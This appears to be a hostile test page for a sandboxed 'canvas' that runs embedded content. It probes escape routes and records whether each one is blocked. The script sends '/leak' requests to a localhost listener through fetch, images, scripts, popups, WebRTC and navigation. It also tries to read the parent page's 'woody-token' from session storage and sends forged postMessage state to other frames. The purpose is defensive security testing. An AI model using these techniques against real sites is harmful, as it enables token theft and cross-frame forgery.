<div id="v">probe</div>
<style>body { padding: 10px; color: var(--red); font-size: 12px; overflow: auto; }</style>
<script>
  // A hostile thing, for testing the canvas: it tries the ways out of its
  // frame and saves what happened as its state. "blocked" is wanted everywhere.
  // Network attempts aim at a listener on port 7811 (check/sink.mjs),
  // whose own record overrules what this page believes.
  const SINKS = ["http://127.0.0.1:7811", "http://localhost:7811"];
  const SINK = SINKS[0];
  const out = [];
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  async function attempt(name, via, fn) {
    let outcome, detail = "";
    try {
      const r = await Promise.race([fn(), wait(2500).then(() => ({ outcome: "blocked", detail: "no answer" }))]);
      outcome = r.outcome; detail = r.detail || "";
    } catch (e) { outcome = "blocked"; detail = String(e.name || e).slice(0, 60); }
    out.push({ name, via, outcome, detail });
  }
  const ok = (detail) => ({ outcome: "ALLOWED", detail });
  const no = (detail) => ({ outcome: "blocked", detail });
  const loads = (el) => new Promise((r) => { el.onload = () => r(ok("loaded")); el.onerror = () => r(no("load error")); });

  (async () => {
    await woody.ready();
    await attempt("fetch to another site", "fetch", () => fetch(`${SINK}/leak?via=fetch`, { mode: "no-cors" }).then(() => ok("answered")));
    await attempt("fetch to the gateway itself", "", () => fetch("/healthz").then(() => ok("answered")));
    await attempt("WebSocket to the gateway", "", () => new Promise((r) => { const w = new WebSocket(location.origin.replace("http", "ws") + "/ws"); w.onopen = () => r(ok("opened")); w.onerror = () => r(no("error")); }));
    await attempt("image from another site", "img", () => { const i = new Image(); const p = loads(i); i.src = `${SINK}/leak?via=img`; return p; });
    await attempt("script from another site", "script", () => { const s = document.createElement("script"); const p = loads(s); s.src = `${SINK}/leak.js?via=script`; document.head.append(s); return p; });
    await attempt("frame inside the thing", "iframe", () => { const f = document.createElement("iframe"); const p = loads(f).then(() => no("the listener decides")); f.src = `${SINK}/leak?via=iframe`; document.body.append(f); return p; });
    await attempt("popup window", "popup", async () => (window.open(`${SINK}/leak?via=popup`) ? ok("a window opened") : no("no window")));
    await attempt("WebRTC connection", "webrtc-stun", async () => {
      if (typeof RTCPeerConnection === "undefined") return no("the interface is gone");
      const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:127.0.0.1:7811" }] });
      pc.createDataChannel("x"); await pc.setLocalDescription(await pc.createOffer()); await wait(1500); pc.close();
      return no("ran; the listener decides");
    });
    await attempt("WebRTC through a blank inner frame", "webrtc-inner", async () => {
      const f = document.createElement("iframe"); document.body.append(f);
      const RTC = f.contentWindow && f.contentWindow.RTCPeerConnection;
      if (!RTC) return no("no interface in the inner frame");
      const pc = new RTC({ iceServers: [{ urls: "stun:127.0.0.1:7812" }] });
      pc.createDataChannel("x"); await pc.setLocalDescription(await pc.createOffer()); await wait(1500); pc.close();
      return no("ran; the listener decides");
    });
    await attempt("read the frame page's document", "", async () => ok(String(parent.document.title)));
    await attempt("read the frame page's access token", "", async () => ok(String(parent.sessionStorage.getItem("woody-token")).slice(0, 6)));
    await attempt("read the frame page's address", "", async () => ok(String(top.location.href)));
    await attempt("read another thing's document", "", async () => ok(String(parent.frames[0].document.body.textContent).slice(0, 20)));
    await attempt("storage of its own", "", async () => { localStorage.setItem("a", "1"); return ok("writable"); });
    await attempt("blocking dialog (alert)", "", async () => { const t = performance.now(); alert("x"); return performance.now() - t < 200 ? no("ignored") : ok("a dialog was shown"); });
    // Speak to the other things, pretending to be the frame page, and ask the bridge for someone else's state.
    for (let i = 0; i < parent.frames.length; i++) { try { if (parent.frames[i] !== window) parent.frames[i].postMessage({ woody: 1, feed: "meters", value: "FORGED" }, "*"); } catch (e) {} }
    parent.postMessage({ woody: 1, id: 0, op: "state.set", thing: "t1", args: { value: { forged: true }, id: "t1" } }, "*");
    out.push({ name: "what the thing can learn (not a failure)", via: "", outcome: "ok", detail: `its own address ${location.pathname.slice(0, 14)}… · ancestors ${[...(location.ancestorOrigins || [])].join(",")}` });
    document.getElementById("v").textContent = `probe done: ${out.filter((o) => o.outcome === "ALLOWED").length} allowed of ${out.length}`;
    await woody.state.set({ probe: out });
    // Last: leave. Each of these replaces this document if it is allowed.
    await wait(300);
    try { top.location.href = `${SINK}/leak?via=top`; } catch (e) {}
    location.href = `${SINK}/leak?via=nav-other`;
  })();
</script>
